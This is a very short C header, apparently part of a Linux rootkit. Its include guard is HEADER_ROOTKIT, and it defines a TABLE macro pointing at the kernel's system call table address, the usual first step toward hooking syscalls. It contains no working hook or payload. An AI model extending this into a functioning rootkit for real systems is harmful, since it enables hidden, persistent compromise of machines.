#ifndef HEADER_ROOTKIT
#define HEADER_ROOTKIT

# define TABLE	(void *)(SYS_CALL_TABLE_ADDR)

#endif
